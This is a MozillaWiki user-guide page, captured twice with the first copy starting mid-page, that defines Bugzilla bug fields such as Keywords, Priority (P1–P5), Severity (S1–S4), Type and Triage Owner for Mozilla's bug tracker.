Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from wiki.mozilla.org_73f8d6fa_20250126_030312.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)


